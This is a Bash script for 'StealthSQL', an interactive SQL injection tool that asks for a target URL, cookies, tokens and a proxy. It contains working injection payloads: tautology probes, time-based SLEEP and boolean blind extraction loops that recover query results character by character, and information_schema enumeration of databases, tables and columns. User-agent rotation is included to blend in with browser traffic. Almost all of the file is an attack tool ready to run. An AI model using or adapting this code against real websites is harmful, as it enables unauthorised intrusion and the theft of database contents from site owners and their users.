#!/bin/bash

# Color codes for better output readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Global variables to track results
sqli_detected=false
sqli_payloads_found=()
extracted_data=()
enumeration_results=()
script_success=true
error_messages=()


print_banner() {
    clear
    local banner=(
        "******************************************"
        "*                StealthSQL              *"
        "*             SQL Injection Tool         *"
        "*                  v2.0.1                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    echo -e "${CYAN}"
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo -e "${NC}"
}


print_separator() {
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}


print_info() {
    echo -e "${CYAN}[ℹ]${NC} $1"
}


print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}


print_error() {
    echo -e "${RED}[✗]${NC} $1"
}


print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}


print_attempt() {
    echo -e "${MAGENTA}[→]${NC} Trying: ${WHITE}$1${NC}"
}


generate_user_agent() {
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
    )
    local random_index=$((RANDOM % ${#user_agents[@]}))
    echo "${user_agents[$random_index]}"
}


make_request() {
    local url="$1"
    local headers=()
    if [ -n "$session_cookie" ]; then
        headers+=("-H" "Cookie: $session_cookie")
    fi
    if [ -n "$auth_token" ]; then
        headers+=("-H" "Authorization: Bearer $auth_token")
    fi
    if [ -n "$custom_headers" ]; then
        IFS=',' read -ra hdrs <<< "$custom_headers"
        for hdr in "${hdrs[@]}"; do
            headers+=("-H" "$hdr")
        done
    fi
    curl -s -k -A "$user_agent" --proxy "$proxy" "${headers[@]}" "$url"
}


color_print() {
    clear
    print_separator
    echo -e "${GREEN}$output${NC}"
    print_separator
    sleep 0.5
}


color_print_attempt() {
    clear
    print_separator
    echo -e "${GREEN}$output${NC}"
    print_separator
    print_attempt "$1"
}


encode_payload() {
    local payload="$1"
    echo -n "$payload" | jq -sRr @uri
}


get_query_output() {
    local query="$1"
    local row_number="$2"
    local is_count="$3"
    local flag=true
    local query_output=""
    local temp_query_output=""
    local dictionary

    if [ "$is_count" == true ]; then
        dictionary="0123456789"
    else
        dictionary="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_\`{|}~"
    fi

    while [ "$flag" = true ]; do
        flag=false
        for ((j = 1; j < 1000; j++)); do
            for ((i = 0; i < ${#dictionary}; i++)); do
                temp_query_output="$query_output${dictionary:$i:1}"
                color_print_attempt "$temp_query_output"

                if [ "$method" == "T" ]; then
                    if [ "$is_count" == true ]; then
                        payload="' AND IF(MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo ""
                        print_info "Getting rows count..."
                        echo ""
                    else
                        payload="' AND IF(MID(($query LIMIT $row_number,1),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo ""
                        print_info "Scanning row $(($row_number + 1))/$total_rows..."
                        echo ""
                    fi
                    full_url="$url$(encode_payload "$payload")"
                    start_time=$(date +%s)
                    make_request "$full_url" > /dev/null
                    elapsed_time=$(( $(date +%s) - start_time ))
                    if [ "$elapsed_time" -ge "$time_sleep" ]; then
                        flag=true
                        break
                    fi
                elif [ "$method" == "B" ]; then
                    if [ "$is_count" == true ]; then
                        payload="' AND (MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1))!'${dictionary:$i:1}'--+"
                        echo ""
                        print_info "Getting rows count..."
                        echo ""
                    else
                        payload="' AND (MID(($query LIMIT $row_number,1),$j,1))!'${dictionary:$i:1}'--+"
                        echo ""
                        print_info "Scanning row $(($row_number + 1))/$total_rows..."
                        echo ""
                    fi
                    full_url="$url$(encode_payload "$payload")"
                    response=$(make_request "$full_url")
                    current_length=$(echo -n "$response" | wc -c)
                    if [ "$current_length" -ne "$default_length" ]; then
                        flag=true
                        break
                    fi
                fi
                flag=false
            done
            if [ "$flag" = true ]; then
                query_output="$temp_query_output"
                continue
            fi
            break
        done
    done

    echo "$query_output"
}


blind_sql_injection() {
    local method="$1"
    local query_input="$2"
    local total_rows query_output current_output total_output
    local initial_time=$(date +%s)

    print_separator
    if [ "$method" == "B" ]; then
        print_info "Using Boolean Blind SQL Injection"
        default_length=$(make_request "$url" | wc -c)
    else
        time_sleep=${3:-3}
        print_info "Using Time-Based Blind SQL Injection with ${time_sleep}s sleep time"
        sleep 1
    fi
    print_separator

    total_rows=$(get_query_output "$query_input" 0 true)
    output+="\n${CYAN}Total rows:${NC} ${WHITE}$total_rows${NC}\n"
    color_print

    for ((i = 0; i < total_rows; i++)); do
        current_output=$(get_query_output "$query_input" "$i")
        output+="\n${GREEN}[✓]${NC} Query output: ${WHITE}$current_output${NC}"
        total_output="$output\n"
        extracted_data+=("$current_output")
        color_print
    done

    if [ "$total_rows" -gt 1 ]; then
        echo ""
        print_success "All rows retrieved successfully!"
        echo ""
        output="$total_output"
        color_print
    fi

    local total_time=$(( $(date +%s) - initial_time ))
    print_separator
    print_success "Total time: $(date -u -d @$total_time +'%H:%M:%S')"
    print_separator
}


detect_sqli() {
    local url="$1"
    local payloads=(
        "' OR '1'='1"
        "' OR '1'='1' -- "
        "\" OR \"1\"=\"1"
        "\" OR \"1\"=\"1\" -- "
        "' AND 1=1 -- "
    )
    echo ""
    print_separator
    print_info "Detecting SQL injection vulnerabilities..."
    print_separator

    for payload in "${payloads[@]}"; do
        print_attempt "Testing payload: $payload"
        full_url="$url$(encode_payload "$payload")"
        response=$(make_request "$full_url")
        if [[ "$response" =~ "error" || "$response" =~ "syntax" ]]; then
            print_warning "Potential SQL Injection found with payload: $payload"
            sqli_detected=true
            sqli_payloads_found+=("$payload")
        fi
    done

    if [ "$sqli_detected" = true ]; then
        return 0
    else
        print_success "No SQL Injection vulnerabilities detected."
        return 1
    fi
}


enumerate() {
    local query="$1"
    local data_type="$2"
    local enum_start_idx=${#extracted_data[@]}

    echo ""
    print_separator
    case $data_type in
        databases)
            query="SELECT schema_name FROM information_schema.schemata"
            print_info "Enumerating databases..."
            ;;
        tables)
            query="SELECT table_name FROM information_schema.tables WHERE table_schema = '$query'"
            print_info "Enumerating tables in database: $query"
            ;;
        columns)
            query="SELECT column_name FROM information_schema.columns WHERE table_name = '$query'"
            print_info "Enumerating columns in table: $query"
            ;;
        *)
            print_error "Invalid data type for enumeration."
            return 1
            ;;
    esac
    print_separator

    blind_sql_injection "$method" "$query"

    # Store enumeration results
    local enum_count=$((${#extracted_data[@]} - enum_start_idx))
    if [ $enum_count -gt 0 ]; then
        enumeration_results+=("$data_type: $enum_count items found")
    fi
}


generate_report() {
    local format="$1"
    local report_file="sqli_report.$format"
    echo -e "$output" > "$report_file"

    if [ $? -eq 0 ]; then
        print_success "Report generated: $report_file"
    else
        print_error "Failed to generate report"
    fi
}


print_final_summary() {
    echo ""
    echo ""
    print_separator
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}                  RÉSUMÉ DE L'EXÉCUTION                ${NC}"
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
    print_separator
    echo ""

    # SQL Injection Detection Status
    echo -e "${BOLD}${WHITE}[1] Détection de vulnérabilité SQL Injection:${NC}"
    if [ "$sqli_detected" = true ]; then
        print_success "Vulnérabilité SQL Injection détectée!"
        echo -e "    ${CYAN}└─${NC} Payloads réussis: ${WHITE}${#sqli_payloads_found[@]}${NC}"
        for payload in "${sqli_payloads_found[@]}"; do
            echo -e "       ${YELLOW}•${NC} $payload"
        done
    else
        print_warning "Aucune vulnérabilité SQL Injection détectée"
    fi
    echo ""

    # Extracted Data Summary
    echo -e "${BOLD}${WHITE}[2] Extraction de données:${NC}"
    if [ ${#extracted_data[@]} -gt 0 ]; then
        print_success "Données extraites avec succès!"
        echo -e "    ${CYAN}└─${NC} Nombre total d'entrées: ${WHITE}${#extracted_data[@]}${NC}"
        echo ""
        echo -e "    ${YELLOW}Données récupérées:${NC}"
        local count=1
        for data in "${extracted_data[@]}"; do
            if [ -n "$data" ]; then
                echo -e "       ${GREEN}[$count]${NC} ${WHITE}$data${NC}"
                ((count++))
            fi
        done
    else
        print_error "Aucune donnée extraite"
    fi
    echo ""

    # Enumeration Results
    echo -e "${BOLD}${WHITE}[3] Résultats de l'énumération:${NC}"
    if [ ${#enumeration_results[@]} -gt 0 ]; then
        print_success "Énumération effectuée"
        for result in "${enumeration_results[@]}"; do
            echo -e "    ${CYAN}└─${NC} ${WHITE}$result${NC}"
        done
    else
        print_info "Aucune énumération effectuée"
    fi
    echo ""

    # Overall Status
    print_separator
    echo -e "${BOLD}${WHITE}[4] Statut global:${NC}"
    if [ "$sqli_detected" = true ] && [ ${#extracted_data[@]} -gt 0 ]; then
        echo -e "    ${GREEN}${BOLD}✓ SUCCÈS${NC} - Le script a fonctionné et des données ont été extraites!"
        script_success=true
    elif [ "$sqli_detected" = true ]; then
        echo -e "    ${YELLOW}${BOLD}⚠ PARTIEL${NC} - Vulnérabilité détectée mais données non extraites"
        script_success=false
    else
        echo -e "    ${RED}${BOLD}✗ ÉCHEC${NC} - Aucune vulnérabilité détectée ou données extraites"
        script_success=false
    fi
    echo ""

    # Error Messages (if any)
    if [ ${#error_messages[@]} -gt 0 ]; then
        echo -e "${BOLD}${WHITE}[5] Erreurs rencontrées:${NC}"
        for error in "${error_messages[@]}"; do
            print_error "$error"
        done
        echo ""
    fi

    print_separator
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
    print_separator
}


main() {
    print_banner

    print_separator
    print_info "Configuration Setup"
    print_separator
    echo ""

    read -p "$(echo -e "${CYAN}[?]${NC} Enter the target URL: ")" url
    url="${url%/}"
    print_success "Target URL set: $url"
    echo ""

    read -p "$(echo -e "${CYAN}[?]${NC} Session cookie (press Enter to skip): ")" session_cookie
    [ -n "$session_cookie" ] && print_success "Session cookie configured"

    read -p "$(echo -e "${CYAN}[?]${NC} Authentication token (press Enter to skip): ")" auth_token
    [ -n "$auth_token" ] && print_success "Auth token configured"

    read -p "$(echo -e "${CYAN}[?]${NC} Proxy (press Enter to skip): ")" proxy
    [ -n "$proxy" ] && print_success "Proxy configured: $proxy"

    read -p "$(echo -e "${CYAN}[?]${NC} Custom headers, comma separated (press Enter to skip): ")" custom_headers
    [ -n "$custom_headers" ] && print_success "Custom headers configured"

    echo ""
    print_separator

    # Auto-generate User-Agent
    user_agent=$(generate_user_agent)
    print_success "Auto-generated User-Agent: ${YELLOW}$user_agent${NC}"
    echo ""
    read -p "$(echo -e "${CYAN}[?]${NC} Use this User-Agent? (y/n, press Enter for yes): ")" ua_confirm
    ua_confirm="${ua_confirm:-y}"
    if [ "$ua_confirm" != "y" ]; then
        read -p "$(echo -e "${CYAN}[?]${NC} Enter custom User-Agent: ")" custom_ua
        user_agent="${custom_ua:-$user_agent}"
        print_success "Custom User-Agent set"
    fi

    echo ""
    print_separator
    print_info "Attack Configuration"
    print_separator
    echo ""

    while true; do
        read -p "$(echo -e "${CYAN}[?]${NC} SQLi type [T]ime-based / [B]oolean: ")" method
        read -p "$(echo -e "${CYAN}[?]${NC} SQL query: ")" query_input
        if [[ ! "$query_input" == *"*"* ]]; then
            print_success "Query configured successfully"
            break
        fi
        print_error "Please specify a column name!"
    done

    echo ""
    read -p "$(echo -e "${CYAN}[?]${NC} Enable verbose mode? (y/n): ")" verbose
    if [ "$verbose" == "y" ]; then
        set -x
        print_warning "Verbose mode enabled"
    fi

    echo ""
    detect_sqli "$url"
    blind_sql_injection "$method" "$query_input"

    echo ""
    print_separator
    read -p "$(echo -e "${CYAN}[?]${NC} Enumerate databases/tables/columns? (databases/tables/columns/none): ")" enum_choice
    if [ "$enum_choice" != "none" ]; then
        read -p "$(echo -e "${CYAN}[?]${NC} Enter name for enumeration (empty for databases): ")" enum_name
        enumerate "$enum_name" "$enum_choice"
    fi

    echo ""
    print_separator
    read -p "$(echo -e "${CYAN}[?]${NC} Generate report? (y/n): ")" generate_report_choice
    if [ "$generate_report_choice" == "y" ]; then
        read -p "$(echo -e "${CYAN}[?]${NC} Report format (html/json/csv): ")" report_format
        generate_report "$report_format"
    fi

    echo ""
    print_separator
    print_success "StealthSQL execution completed!"
    print_separator

    # Display final summary of execution results
    print_final_summary
}

main
